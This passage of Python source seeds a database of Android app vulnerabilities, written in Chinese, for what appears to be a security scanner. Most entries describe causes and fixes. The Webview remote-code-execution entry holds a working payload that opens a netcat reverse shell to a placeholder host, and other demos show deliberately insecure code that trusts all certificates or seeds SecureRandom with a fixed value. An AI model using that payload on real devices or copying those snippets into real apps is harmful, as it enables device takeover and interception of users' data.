# coding=utf-8
from management.base_models import VULModel


class SqlStatement(object):
    create_table = 'create table repository (' \
                   'id INTEGER PRIMARY KEY,' \
                   'name VARCHAR(20),' \
                   'cve VARCHAR(20), ' \
                   'typ VARCHAR(20),' \
                   'tag VARCHAR(20),' \
                   'detail CLOB,' \
                   'causes CLOB,' \
                   'affect CLOB,' \
                   'demo CLOB,' \
                   'rank INTEGER,' \
                   'attack_method CLOB,' \
                   'fix_suggest CLOB,' \
                   'is_show INTEGER)'
    insert_sql = 'insert into repository (' \
                 'name,' \
                 'cve,' \
                 'typ,' \
                 'tag,' \
                 'detail,' \
                 'causes,' \
                 'affect,' \
                 'demo,' \
                 'rank,' \
                 'attack_method,' \
                 'fix_suggest,' \
                 'is_show) ' \
                 'VALUES %s'
    drop_table = 'drop table repository'


class Repository(VULModel):
    def create_table(self):
        self.exec_sql(SqlStatement.create_table)

    def drop_table(self):
        self.exec_sql(SqlStatement.drop_table)

    def init_table(self):
        for r in repo_zrx():
            rep_val = (
                r['name'], r['cve'], r['typ'], r['tag'], r['detail'], r['causes'], r['affect'], r['demo'], r['rank'],
                r['attack_method'], r['fix_suggest'], r['is_show'])
            sql = SqlStatement.insert_sql % str(rep_val)
            self.exec_sql(sql)


def repo_zrx():
    r_list = []
    export_content_provider = {
        'name': 'Content Provider组件可被导出',
        'cve': 'export_contentprovider',
        'detail': '可能会导致用户敏感信息泄漏等',
        'causes': '在AndroidManifest.xml中没有声明android:exported属性为false',
        'typ': 2,
        'tag': 'Content Provider',
        'rank': '3',
        'affect': 'android4.2及以上版本由以前的exported属性默认ture改为默认false,默认值为true可能会导致用户敏感信息泄漏或openfile遍历',
        'demo': '<provider android:name=”MyContentProvider” android:authorities=”com.wissen.MyContentProvider” />',
        'attack_method': '反编译查看AndroidManifest.xml文件定位content provider是否导出，是否配置权限',
        'fix_suggest': '公开的content provider确保不存储敏感数据，提供asset文件时注意权限保护',
        'is_show': 1
    }
    r_list.append(export_content_provider)

    allow_backup = {
        'name': '允许任意备份',
        'cve': 'allow_backup',
        'detail': 'AndroidManifest.xml文件中的allowBackup值控制该属性，其默认为true。当该属性没有显式设置为false时，恶意攻击者可以通过备份应用程序获得用户的敏感信息。',
        'causes': 'allowBackup的值为false',
        'typ': 1,
        'tag': 'alloe_backup',
        'rank': '3',
        'affect': '影响Android 2.1以上的系统。',
        'demo': '无',
        'attack_method': '反编译AndroidManifest.xml文件定位allowBackup是否配置权限',
        'fix_suggest': '建议禁止任意备份',
        'is_show': 1
    }
    r_list.append(allow_backup)

    is_testable = {
        'name': '处于测试模式',
        'cve': 'is_testable',
        'detail': '处于测试模式的应用程序可能会暴露一些不属于自己的功能或数据，这将引发安全漏洞。这种应用程序只能通过adb进行安装。',
        'causes': '没有配置AndroidManifest.xml中testOnly属性。',
        'typ': 1,
        'tag': 'testable',
        'rank': '3',
        'affect': '影响Android所有版本',
        'demo': '无',
        'attack_method': '反编译AndroidManifest.xml文件定位testOnly是否配置权限',
        'fix_suggest': '建议关闭测试模式',
        'is_show': 1,
    }
    r_list.append(is_testable)

    is_debugable = {
        'name': '允许任意调试',
        'cve': 'is_debugable',
        'detail': '允许任意调试的应用程序可以给攻击者提供很方便的调试接口，授予其访问、修改运行时的敏感数据的权限，对业务和个人信息带来安全隐患。此属性由AndroidManifest.xml中debuggable属性控制。',
        'causes': 'Android.xml文件中debuggable没有配置权限',
        'typ': 1,
        'tag': 'debugable',
        'rank': '3',
        'affect': '影响Android所有版本',
        'demo': '无',
        'attack_method': '反编译查看AndroidManifest.xml文件是否配置权限',
        'fix_suggest': '建议禁止允许任意调试',
        'is_show': 1
    }
    r_list.append(is_debugable)

    universal_sign_risk = {
        'name': '通用签名风险',
        'cve': 'universal_sign_risk',
        'detail': '若应用使用了公开的签名证书，则有可能使二次打包的应用替换掉已安装的官方应用',
        'causes': '应用使用了公开的签名',
        'typ': 1,
        'tag': 'universal_sign',
        'rank': '3',
        'affect': 'Android所有版本',
        'demo': '无',
        'attack_method': '将包名设置成与应用相同的包名，并使用应用的签名私钥对应用进行签名',
        'fix_suggest': '生成自己的私钥来签名，并保护私钥不被泄漏',
        'is_show': 1
    }
    r_list.append(universal_sign_risk)

    communicate_test = {
        'name': '通讯安全测试',
        'cve': 'communicate_test',
        'detail': '若应用直接使用HTTP协议或者SSL v3以下版本通信，进行登录账户或交换数据等业务操作，可能会引发数据信息泄露。建议使用TLS v1.2以上版本协议通信。',
        'causes': '应用直接使用http协议或使用SSL v3一下版本通信',
        'typ': 3,
        'tag': 'communicate',
        'rank': '3',
        'affect': 'Android所有版本',
        'demo': '无',
        'attack_method': '攻击者可以中间人攻击截获用户的通讯数据',
        'fix_suggest': '建议使用SSL v3以上版本进行通信',
        'is_show': 1
    }
    r_list.append(communicate_test)

    server_cert = {
        'name': '服务器证书校验',
        'cve': 'server_cert',
        'detail': '服使用HTTPS协议时，客户端必须对服务器证书进行完整校验，以验证服务器是真实合法的目标服务器。',
        'causes': '使用https协议没有进行证书完整性校验',
        'typ': 3,
        'tag': 'server',
        'rank': '3',
        'affect': 'Android所有版本',
        'demo': '无',
        'attack_method': '如果没有校验，客户端可能与仿冒的服务器建立通信链接，即“中间人攻击”，造成敏感数据的泄露。',
        'fix_suggest': '建议进行证书完整性校验',
        'is_show': 1,
    }
    r_list.append(server_cert)

    client_cert_bind = {
        'name': '客户端证书绑定',
        'cve': 'client_cert_bind',
        'detail': '若客户端证书没有直接绑定，则会使用系统信任的证书颁发机构颁发的证书。',
        'causes': '客户端没有绑定证书',
        'typ': 3,
        'tag': 'client_bind',
        'rank': '3',
        'affect': 'Android所有版本',
        'demo': '无',
        'attack_method': '黑客可以使用经过修改的系统环境让APP信任证书，从而截获流量，对敏感数据和业务造成安全威胁。',
        'fix_suggest': '建议客户端绑定证书',
        'is_show': 1,
    }
    r_list.append(client_cert_bind)

    load_dynamic = {
        'name': '本地加载动态库',
        'cve': 'load_dynamic',
        'detail': 'Anroid4.1之前的系统版本容许Android应用将动态加载的DEX文件存储在被其他应用任意读写的目录中(如sdcard)，因此不能够保护应用免遭恶意代码的注入。',
        'causes': '系统版本允许动态加载DEX文件',
        'typ': 4,
        'tag': 'loaddynamic',
        'rank': '3',
        'affect': 'Android4.1版本以前',
        'demo': '无',
        'attack_method': '攻击者可以通过对程序加载动态库从而注入恶意代码',
        'fix_suggest': '建议禁止加载动态库',
        'is_show': 1,
    }
    r_list.append(load_dynamic)

    use_naive = {
        'name': '使用原生层代码',
        'cve': 'use_naive',
        'detail': '使用原生层代码能够隐藏Android Framework层的API调用，提高APP运行的效率，实现大多数安全相关的防护功能。',
        'causes': '开发者使用原生层代码编写应用程序',
        'typ': 4,
        'tag': 'usenaive',
        'rank': '3',
        'affect': 'Android所有版本',
        'demo': '无',
        'attack_method': '使用原生层代码能够隐藏Android Framework层的API调用，提高APP运行的效率，实现大多数安全相关的防护功能。',
        'fix_suggest': '建议使用原生层代码进行程序开发',
        'is_show': 1,
    }
    r_list.append(use_naive)

    use_reflect = {
        'name': '使用反射调用',
        'cve': 'use_reflect',
        'detail': '应用若使用反射调用运行机制，则可能存在调用数据不可控的原因而造成的远程代码执行漏洞。',
        'causes': '开发者使用反射运行机制',
        'typ': 4,
        'tag': 'usereflect',
        'rank': '3',
        'affect': '影响Android4.2以下版本',
        'demo': '无',
        'attack_method': '攻击者可利用反射机制调用Android API进行各种恶意操作',
        'fix_suggest': '建议禁止使用反射运行机制',
        'is_show': 1,
    }
    r_list.append(use_reflect)

    use_crypto = {
        'name': '使用加密函数',
        'cve': 'use_crypto',
        'detail': '应用程序对部分敏感信息使用了代码层的加密保护，可以很好地保护客户端应用，增加攻击者的攻击成本。',
        'causes': '开发者使用加密函数对程序中敏感信息做加密保护',
        'typ': 4,
        'tag': 'encryption function',
        'rank': '3',
        'affect': 'Android所有版本',
        'demo': '无',
        'attack_method': '攻击者通过非法途径获取解密秘钥对程序进行攻击',
        'fix_suggest': '建议使用严谨的加密算法',
        'is_show': 1,
    }
    r_list.append(use_crypto)

    use_mix = {
        'name': '使用混淆保护',
        'cve': 'use_mix',
        'detail': '应用程序对代码部分的变量和运行逻辑使用混淆保护，可以防止恶意攻击者分析该应用程序，增加攻击者的攻击成本。',
        'causes': '使用混淆工具对代码进行混淆保护',
        'typ': 4,
        'tag': 'Obfuscated code',
        'rank': '3',
        'affect': 'Android所有版本',
        'demo': '无',
        'attack_method': '攻击者根据混淆后代码分析出程序运行逻辑',
        'fix_suggest': '增强混淆程度',
        'is_show': 1,
    }
    r_list.append(use_mix)

    root_detect = {
        'name': '设备ROOT检测',
        'cve': 'root_detect',
        'detail': '应用程序如果涉及到敏感数据的存储，建议对设备是否被ROOT进行检测。增加防御或者提示的运行机制，保护客户端用户的信息安全。',
        'causes': '开发者为了保护客户端敏感数据，对设备进行ROOT检测',
        'typ': 7,
        'tag': 'root_detect',
        'rank': '3',
        'affect': 'Android所有版本',
        'demo': '无',
        'attack_method': '攻击者可使用工具对获取ROOT权限的设备进行敏感信息读取',
        'fix_suggest': '建议对设备进行ROOT检测，给予ROOT提示',
        'is_show': 1,
    }
    r_list.append(root_detect)

    cg_detect = {
        'name': '篡改检测',
        'cve': 'cg_detect',
        'detail': '应用程序对自身是否被篡改应进行检测，防止恶意攻击者二次打包分析应用，增加攻击者的攻击成本。',
        'causes': '程序进行自身完整性检验',
        'typ': 4,
        'tag': 'cg_detect',
        'rank': '3',
        'affect': 'Android所有版本',
        'demo': '无',
        'attack_method': '攻击者对程序资源文件进行篡改或篡改代码',
        'fix_suggest': '建议对程序的自身完整性进行校验',
        'is_show': 1,
    }
    r_list.append(cg_detect)

    debug_detect = {
        'name': '调试检测',
        'cve': 'debug_detect',
        'detail': '调试检测机制可以阻止攻击者利用GDB、Ptrace等调试器跟踪运行程序，查看、修改内存中的代码和数据等行为。保护客户的关键数据以及服务器的信息安全，增加攻击者的攻击成本。',
        'causes': '开发者对动态调试进行了限制',
        'typ': 4,
        'tag': 'debug',
        'rank': '3',
        'affect': 'Android所有版本',
        'demo': '无',
        'attack_method': '攻击者可通过调试器对程序进行动态调试',
        'fix_suggest': '建议对程序进行加固',
        'is_show': 1,
    }
    r_list.append(debug_detect)

    emulator_detect = {
        'name': '模拟器检测',
        'cve': 'emulator_detect',
        'detail': '对于运行在模拟器中的应用程序，攻击者可以从里到外地分析该应用的行为特征、流量数据、代码逻辑等。因此建议增加模拟器检测，增加攻击者的攻击成本。',
        'causes': '从 APK 自我保护的角度出发，需要增加对 APK 当前运行环境检测',
        'typ': 4,
        'tag': 'emulator',
        'rank': '3',
        'affect': 'Android所有版本',
        'demo': '''public static boolean isEmulator(Context context){
                   try{
                   TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
                   String imei = tm.getDeviceId();
                   if (imei != null && imei.equals("000000000000000")){
                   return true;
                     }
                   return (Build.MODEL.equals("sdk")) || (Build.MODEL.equals("google_sdk"));
                     }catch (Exception ioe) {

                    }
                   return false;
                }''',
        'attack_method': '攻击者可以通过模拟器对程序进行网络行为分析、动态调试等',
        'fix_suggest': '建议添加模拟器检测并对程序运行环境进行限制',
        'is_show': 1,
    }
    r_list.append(emulator_detect)

    export_service = {
        'name': 'service组件可被导出',
        'cve': 'export_service',
        'detail': 'service导出属性为true可能会引发应用权限提升、劫持等危险',
        'causes': '在AndroidManifest.xml中没有声明android:exported属性为false',
        'typ': 1,
        'tag': 'service',
        'rank': '3',
        'affect': '''该漏洞可影响Android所有系统,如果没有声明android:exported属性为false则可能导致强制结束运行应用、service劫持、本地客户端决绝服务、消息伪造等''',
        'demo': '''<service android:enabled="true" android:exported="true" android:name="xx.xxxx.android.service.DaemonService">
             <intent-filter>
             <action android:name="xx.xx.android.intent.DaemonService"/>
                <category android:name="com.xxx.appstore"/>
             </intent-filter>
            </service>''',
        'attack_method': '反编译查看AndroidManifest.xml文件定位android:exported属性，是否配置权限，根据业务情况编写测试poc或者直接使用adb命令测试',
        'fix_suggest': '只被应用本身使用的service应设置为私有;service接收到的数据需谨慎处理等',
        'is_show': 1,
    }
    r_list.append(export_service)

    export_broadcastrecevier = {
        'name': 'Broadcast Recevier组件组件可被导出',
        'cve': 'export_broadcastrecevier',
        'detail': 'Broadcast Recevier导出属性为true可能会引发敏感信息泄漏、权限绕过等危险',
        'causes': '在AndroidManifest.xml中没有声明android:exported属性为false',
        'typ': 1,
        'tag': 'Broadcast Recevier',
        'rank': '3',
        'affect': '''android3.1以及之后版本广播接收器不能在启动应用前注册。可以通过设置intent的flag为Intent.FLAG_INCLUDE_STOPPED_PACKAGES将广播发送给未启动应用的广播接收器;可能会导致伪造消息代码执行、广播组件没有对消息进行校验、利用广播传输用户账号密码、权限绕过等危险''',
        'demo': '''<receiver android:enabled="true" android:exported="false" android:name="com.xxxx.xxx.appcatalog.push.JPushReceiver">
                    <intent-filter>
                    <category android:name="com.xxx.appstore"/>
                    </intent-filter>
                </receiver>''',
        'attack_method': '反编译查看AndroidManifest.xml文件定位android:exported属性，查找发送广播内的信息检索sendBroadcast与sendOrderedBroadcast，注意setPackage方法于receiverPermission变量。发送测试广播,接收指定广播。',
        'fix_suggest': '''对接收来的广播进行验证,内部app之间的广播使用protectionLevel='signature'验证其是否真是内部app，返回结果时需注意接收app是否会泄露信息''',
        'is_show': 1,
    }
    r_list.append(export_broadcastrecevier)

    export_activity = {
        'name': 'Activity组件可被导出',
        'cve': 'export_activity',
        'detail': 'Activity导出属性为true可能会引发敏感信息泄漏、界面劫持等危险',
        'causes': '在AndroidManifest.xml中没有声明android:exported属性为false',
        'typ': 1,
        'tag': 'Activity',
        'rank': '4',
        'affect': '该漏洞可影响Android所有系统，没有声明android:exported属性为false可能会导致android客户端本地密码绕过，android客户端本地拒绝服务漏洞在activity可以任意外部程序调用导致进程crash，activity劫持',
        'demo': '''<activityandroid:exported="false" android:name="cn.xxx.android.ui.PushActivity" android:theme="@style/ActivityTheme">
                <intent-filter>
                    <action android:name="cn.jpush.android.ui.PushActivity"/>
                    <category android:name="android.intent.category.DEFAULT"/>
                    <category android:name="com.xxx.appstore"/>
                </intent-filter>
                </activity>''',
        'attack_method': '''反编译查看AndroidManifest.xml文件定位android:exported属性，是否配置权限，自己编写app调用startActiviy()或startActivityForResult()''',
        'fix_suggest': 'app内使用的私有Activity不应配置intent-filter，如果配置了intent-filter需设置exported属性为false。谨慎处理接收的intent以及其携带的信息;验证目标Activity是否恶意app，以免受到intent欺骗，可用hash签名验证等',
        'is_show': 1,
    }
    r_list.append(export_activity)

    load_activity = {
        'name': '指定Activity加载模式',
        'cve': 'load_activity',
        'detail': '''直接调用启动activity''',
        'causes': '在AndroidManifest.xml中没有声明android:exported属性为false',
        'typ': 1,
        'tag': 'Activity',
        'rank': '4',
        'affect': '该漏洞可影响Android所有系统，直接调用启动activity,可能被钓鱼或盗号',
        'demo': '''<activityandroid:exported="false" android:name="cn.xxx.android.ui.PushActivity">
            </activity>''',
        'attack_method': '''启动一个后台服务，监听当前执行的进程 ，获取在栈顶的进程。当遇到到"xxx.com",暂停运行一段时间，选择一个时刻弹出悬浮窗口''',
        'fix_suggest': '将不必要的exported设置为不可导出',
        'is_show': 1,
    }
    r_list.append(load_activity)

    unsafe_activity = {
        'name': '不安全地载入任务栈',
        'cve': 'unsafe_activity',
        'detail': '''攻击者精心设计恶意Activity覆盖原有的Activity''',
        'causes': '组件可被导出',
        'typ': 2,
        'tag': 'Activity',
        'rank': '4',
        'affect': '''该漏洞可影响Android所有系统,攻击者精心设计恶意Activity覆盖原有的Activity,可能在用户不知道的情况下替代原有的Activity，用户可能被钓鱼''',
        'demo': '无',
        'attack_method': '攻击者可以将任务栈中的Activity篡改成恶意Activity非法获取用户输入的信息',
        'fix_suggest': '当应用在后台运行时给出后台运行提示',
        'is_show': 1,
    }
    r_list.append(unsafe_activity)

    global_openfile = {
        'name': '全局可读写的内部文件',
        'cve': 'global_openfile',
        'detail': '可以被其它程序任意读取和修改',
        'causes': '''开发者使用openFileOutput(String name,int mode)方法创建内部文件或者使用getSharedPreferences读取配置信息时，使用MODE_WORLD_READABLE或MODE_WORLD_WRITEABLE模式。''',
        'typ': 4,
        'tag': 'openFile',
        'rank': '4',
        'affect': '该漏洞可影响Android所有系统，可以被其它程序任意读取和修改,造成信息泄露和恶意篡改',
        'demo': 'fos = openFileOutput(FILE_NAME, Context.MODE_WORLD_READABLE);',
        'attack_method': '攻击者可以很容易编写一个读取文件内容的应用程序来读取其中信息',
        'fix_suggest': '建议禁止全局文件可读写',
        'is_show': 1,
    }
    r_list.append(global_openfile)

    webview_rce = {
        'name': 'Webview远程代码执行',
        'cve': 'webview_rce',
        'detail': '远程攻击者可通过使用Java Reflection API利用该漏洞执行任意Java对象的方法',
        'causes': '该漏洞源于程序没有正确限制使用WebView.addJavascriptInterface方法',
        'typ': 4,
        'tag': 'webview',
        'rank': '3',
        'affect': '''Android系统版本低于4.2会受该漏洞影响，远程攻击者可通过使用Java Reflection API利用该漏洞执行任意Java对象的方法,可能导致被篡改的URL中存在的恶意代码被执行，用户手机被安装木马程序，发送扣费短信，通信录或者短信被窃取，甚至手机被远程控制''',
        'demo': '''<html>
             <body>
             <script>
                 function execute(cmdArgs)
                 {
                     return injectedObj.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
                 }
                 execute(["/system/bin/sh","-c","rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/system/bin/sh -i 2>&1|nc x.x.x.x 9099 >/tmp/f"]);
             </script>
             </body>
            </html>''',
        'attack_method': '可以利用反射机制调用未注册的其它任何Java类，最终导致JavaScript能力的无限增强',
        'fix_suggest': 'API Level等于或高于17的Android系统，移除android系统内部的默认内置接口',
        'is_show': 1,
    }
    r_list.append(webview_rce)

    debug_webview = {
        'name': 'Webview远程调试开启',
        'cve': 'debug_webview',
        'detail': '远程调试设置为开启状态',
        'causes': '''Androidmanifest.xml文件中设置了"permissions": ["debugger"]''',
        'typ': 4,
        'tag': 'webview',
        'rank': '3',
        'affect': '该漏洞可影响Android所有系统，远程调试设置为开启状态,可能遭受恶意攻击',
        'demo': '''if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
              if ( 0 != ( getApplcationInfo().flags &= ApplicationInfo.FLAG_DEBUGGABLE ) ) {
                     WebView.setWebContentsDebuggingEnabled(true);
                  }}''',
        'attack_method': '攻击者可以通过远程控制来操作用户的移动设备',
        'fix_suggest': 'Androidmanifest.xml文件中设置为不可调试状态',
        'is_show': 1,
    }
    r_list.append(debug_webview)

    trust_allcertificate = {
        'name': '信任所有证书',
        'cve': 'trust_allcertificate',
        'detail': '应用没有严格对服务端和客户端证书进行校验，或者信任了所有主机',
        'causes': '开发者在代码中不检查服务器证书的有效性，或选择接受所有的证书',
        'typ': 3,
        'tag': '',
        'rank': '4',
        'affect': '该漏洞可影响Android所有系统，应用没有严格对服务端和客户端证书进行校验，或者信任了所有主机，覆盖了Google的证书认证机制，对于异常事件的处理直接return null，攻击者可以通过设置DNS服务器使客户端与指定的服务器进行通信,可能导致的问题是中间人攻击',
        'demo': '''public static HttpClient getNewHttpClient() { 
             try { 
                //获得密匙库
                KeyStore trustStore = KeyStore.getInstance(KeyStore.getDefaultType()); 
                trustStore.load(null, null); 
                SSLSocketFactory sf = new SSLSocketFactoryEx(trustStore);
                //信任所有主机名
                sf.setHostnameVerifier(SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER); 
                HttpParams params = new BasicHttpParams(); 
                HttpProtocolParams.setVersion(params, HttpVersion.HTTP_1_1); 
                HttpProtocolParams.setContentCharset(params, HTTP.UTF_8); 
                SchemeRegistry registry = new SchemeRegistry(); 
                registry.register(new Scheme("http", PlainSocketFactory.getSocketFactory(), 80)); 
                registry.register(new Scheme("https", sf, 443)); 
                ClientConnectionManager ccm = new ThreadSafeClientConnManager(params, registry); 
                return new DefaultHttpClient(ccm, params); 
            } catch (Exception e) { 
                return new DefaultHttpClient(); 
            } 
        }''',
        'attack_method': '''攻击者在服务器上部署另一个证书，在会话建立阶段，客户端会收到这张证书，如果客户端忽略这个证书上的异常，或者接受这个证书，就会成功建立会话、           开始加密通信。但攻击者拥有私钥，因此可以解密得到客户端发来数据的明文。攻击者还可以模拟客户端，与真正的服务器联系，充当中间人做监                    听。''',
        'fix_suggest': '''建议严格对服务端和客户端证书进行校验，禁止信任所有证书，对于异常事件的处理不应该直接return null。''',
        'is_show': 1,
    }
    r_list.append(trust_allcertificate)

    unsafe_random = {
        'name': '不安全的随机函数',
        'cve': 'unsafe_random',
        'detail': '''在SecureRandom生成随机数时，如果我们不调用setSeed方法，SecureRandom会从系统中找到一个默认随机源。每次生成随机数时都会从这个随机源中取seed。''',
        'causes': '加密时如果使用SecureRandom中的setSeed方法设置种子将会造成生成的随机数不随机',
        'typ': 4,
        'tag': 'SecureRandom',
        'rank': '2',
        'affect': 'Android 4.2以下受该漏洞影响,会使加密数据容易被破解',
        'demo': '''SecureRandom secureRandom = new SecureRandom();
                    byte[] b = new byte[] { (byte) 1 };
                    secureRandom.setSeed(b);
                    // Prior to Android 4.2, the next line would always return the same number!
                    System.out.println(secureRandom.nextInt());''',
        'attack_method': '''在Android 4.2以下，SecureRandom是基于老版的Bouncy Castle实现的。如果生成SecureRandom对象后马上调用setSeed方法。SecureRandom会用用户设置的          seed代替默认的随机源。使得每次生成随机数时都是会使用相同的seed作为输入。从而导致生成的随机数是相同的。''',
        'fix_suggest': '建议通过/dev/urandom或者/dev/random获取的熵值来初始化伪随机数生成器',
        'is_show': 1,
    }
    r_list.append(unsafe_random)

    print_log = {
        'name': '打印调试日志',
        'cve': 'print_log',
        'detail': '通过logcat打印的调试信息或者错误异常信息，可以定位应用运行的流程或者关键代码',
        'causes': '未关闭输出日志信息',
        'typ': 4,
        'tag': 'log',
        'rank': '2',
        'affect': '该漏洞可影响Android所有系统，可能暴露用户敏感信息',
        'demo': '''import android.util.Log; 
                public class L 
                { 
                    private L() 
                    { 
                        /* cannot be instantiated */
                        throw new UnsupportedOperationException("cannot be instantiated"); 
                    } 
                    public static boolean isDebug = true;// 是否需要打印bug，可以在application的onCreate函数里面初始化 
                    private static final String TAG = "way"; 
                // 下面四个是默认tag的函数 
                    public static void i(String msg) 
                    { 
                    if (isDebug) 
                        Log.i(TAG, msg); 
                } 
                    public static void d(String msg) 
                { 
                        if (isDebug) 
                            Log.d(TAG, msg); 
                    } 
                    public static void e(String msg) 
                    { 
                        if (isDebug) 
                         Log.e(TAG, msg); 
                    } 
                    public static void v(String msg) 
                    { 
                        if (isDebug) 
                         Log.v(TAG, msg); 
                 } 
                // 下面是传入自定义tag的函数 
                    public static void i(String tag, String msg) 
                    { 
                        if (isDebug) 
                            Log.i(tag, msg); 
                    } 
                    public static void d(String tag, String msg) 
                    { 
                        if (isDebug) 
                         Log.i(tag, msg); 
                 } 
                    public static void e(String tag, String msg) 
                    { 
                        if (isDebug) 
                            Log.i(tag, msg); 
                    } 
                    public static void v(String tag, String msg) 
                    { 
                        if (isDebug) 
                            Log.i(tag, msg); 
                    } 
                }''',
        'attack_method': '使用ddms工具产看应用运行日志',
        'fix_suggest': '''开发者在开发应用过程中应该注意防范信息泄露。在应用发布时要注意删除logcat输出或者打印的诸如用户名，密码，token，cookie和imei等隐私、敏感信息。''',
        'is_show': 1,
    }
    r_list.append(print_log)

    execute_systemcommands = {
        'name': '执行系统命令',
        'cve': 'execute_systemcommands',
        'detail': '能够执行系统命令',
        'causes': '程序中出现getRuntime().exec()或getRuntime()函数',
        'typ': 4,
        'tag': 'webView',
        'rank': '2',
        'affect': '该漏洞可影响Android所有版本；会执行系统命令,可能会越过用户直接对系操作。',
        'demo': '无',
        'attack_method': '可以使用getRuntime().exec()或getRuntime()函数进行一些恶意操作',
        'fix_suggest': '用原生层的函数替代直接在Java层执行系统命令。',
        'is_show': 1,
    }
    r_list.append(execute_systemcommands)

    provider_commandinfo = {
        'name': '应用证书信息',
        'cve': 'provider_CommandInfo',
        'detail': '在互联网上的用于身份验证',
        'causes': '客户端对应用证书校验不严谨',
        'typ': 3,
        'tag': 'Certificate Authority',
        'rank': '4',
        # 'harm': '秘钥被破解,泄露用户敏感信息',
        'affect': '该漏洞可影响Android所有版本，秘钥被破解,泄露用户敏感信息',
        'demo': ''' public static HttpClient getNewHttpClient() {
                try {
                    //获得密匙库
                    KeyStore trustStore = KeyStore.getInstance(KeyStore.getDefaultType());
                    trustStore.load(null, null);

                    SSLSocketFactory sf = new SSLSocketFactoryEx(trustStore);
                    //信任所有主机名
                    sf.setHostnameVerifier(SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER);

                    HttpParams params = new BasicHttpParams();
                    HttpProtocolParams.setVersion(params, HttpVersion.HTTP_1_1);
                    HttpProtocolParams.setContentCharset(params, HTTP.UTF_8);

                    SchemeRegistry registry = new SchemeRegistry();
                    registry.register(new Scheme("http", PlainSocketFactory.getSocketFactory(), 80));
                    registry.register(new Scheme("https", sf, 443));

                    ClientConnectionManager ccm = new ThreadSafeClientConnManager(params, registry);

                    return new DefaultHttpClient(ccm, params);
                } catch (Exception e) {
                    return new DefaultHttpClient();
                }
            }  ''',
        'attack_method': '截获数据流量包，对秘钥破解',
        'fix_suggest': '非浏览器app，有钱申请ca证书没钱在客户端中添加证书,切勿信任所有证书;浏览器app，严格按照客户端校验服务器证书流程处理;CA的公钥能否正确解开服务器证书的CA数字签名，即证书的签名值',
        'is_show': 1,
    }
    r_list.append(provider_commandinfo)

    password_webview = {
        'name': 'Webview密码明文保存',
        'cve': 'password_webview',
        'detail': '用户名和密码将被明文存储到该应用目录databases/webview.db中。',
        'causes': 'Android的Webview组件中默认打开了提示用户是否保存密码的功能',
        'typ': 2,
        'tag': 'webview',
        'rank': '4',
        'affect': '该漏洞可影响Android所有版本，本地明文存储的用户名和密码，不仅会被该应用随意浏览，其他恶意程序也可能通过提权'
                  '或者root的方式访问该应用的webview数据库，从而窃取用户登录过的用户名信息以及密码。',
        'demo': '',
        'attack_method': '可能通过提权或者root的方式访问该应用的webview数据库，从而窃取用户登录过的用户名信息以及密码',
        'fix_suggest': '通过设置WebView.getSettings().setSavePassword(false)关闭webview组件的保存密码功能',
        'is_show': 1,
    }
    r_list.append(password_webview)

    hide_code = {
        'name': '隐藏的启动代码',
        'cve': 'hide_Code',
        'detail': '在data标签中使用 android_secret_code 来处理Android的隐形字符串',
        'causes': '使用 android_secret_code ',
        'typ': 4,
        'tag': 'code',
        'rank': '3',
        'affect': '''该漏洞可影响Android所有版本。在data标签中使用 android_secret_code 来处理Android的隐形字符串,处理结果可能会返回敏感信''',
        'demo': '''<receiver android:name="Listener">
                <intent-filter>
                    <action android:name="android.provider.Telephony.SECRET_CODE" />
                    <data android:scheme="android_secret_code" />
                </intent-filter>
            </receiver>''',
        'attack_method': '''可以通过处理隐形字符串来发送一些危险的广播''',
        'fix_suggest': '''不设置不必要的隐藏启动代码''',
        'is_show': 1,
    }
    r_list.append(hide_code)

    user_defined_sms = {
        'name': '自定义消息接收端口',
        'cve': 'user_defined_sms',
        'detail': '在data标签中使用 android:port 属性来处理Android的URI消息信息',
        'causes': 'AndroidManifest.xml中定义了data android:port="xxx" 标签',
        'typ': 1,
        'tag': 'sms',
        'rank': '3',
        'affect': '''该漏洞可影响Android所有版本，在某个端口监听为一个消息接收器，系统可以用它来接收消息并且认为它来自一个可信的通道,可能会导致接收垃圾信息或骚扰信息''',
        'demo': '''<receiver android:name=".SmsReceiver"> 
                  <intent-filter android:priority="1595023xxxx"> 
               <action  android:name="android.intent.action.DATA_SMS_RECEIVED" /> 
                <data android:scheme="sms" /> 
                <data android:host="localhost" /> 
                <data android:port="6000" /> 
                </intent-filter> 
            </receiver> ''',
        'attack_method': '攻击者可以对安卓安全模块进行权限提升攻击,然后使用一个未经授权的恶意程序来修改短信/彩信的接收状态和信息数据。',
        'fix_suggest': '严格控制短信读写权限',
        'is_show': 1,
    }
    r_list.append(user_defined_sms)

    component_priority = {
        'name': '拥有较高优先级的组件',
        'cve': 'component_priority',
        'detail': '组件设置了一个较高优先级的过滤器',
        'causes': 'AndroidManifest.xml中设置android:pathPrefix',
        'typ': 1,
        'tag': 'pathPrefix',
        'rank': '3',
        'affect': '该漏洞可影响Android所有版本;组件设置了一个较高优先级的过滤器,可能会覆盖系统应用或其他的处理响应',
        'demo': '''final Intent it = new Intent(); 
            it.setAction("android.intent.action.BOOST_DOWNLOADING"); 
            it.putExtra("package_name", "com.android.contacts"); 
            it.putExtra("enabled", true); 
            context.sendBroadcast(it); ''',
        'attack_method': '通过篡改组件优先级对用户手机进行恶意操作',
        'fix_suggest': '严格控制组件优先级',
        'is_show': 1,
    }
    r_list.append(component_priority)

    application_authorizationinfo = {
        'name': '应用内授权信息',
        'cve': 'application_authorizationinfo',
        'detail': '涉及付费的操作以及可能涉及到用户隐私的操作',
        'causes': 'AndroidManifest.xml中定义了标签android:protectionLevel',
        'typ': 1,
        'tag': 'protectionLevel',
        'rank': '3',
        'affect': '该漏洞可影响Android所有版本;可能造成经济损失或泄漏敏感信息',
        'demo': '''<uses-permission android:name="com.huawei.dbank.v7.provider.DBank.READ_DATABASE"/>
                <permission android:name="com.huawei.dbank.v7.provider.DBank.READ_DATABASE"
                android:protectionLevel="dangerous"></permission>''',
        'attack_method': '攻击者可获取应用授权信息，盗取用户资料消耗用户资金',
        'fix_suggest': '严格控制应用授权信息',
        'is_show': 1,
    }
    r_list.append(application_authorizationinfo)

    private_write = {
        'name': '私有模式写入数据到APP目录',
        'cve': 'private_write',
        'detail': '为默认操作模式，代表该文件是私有数据',
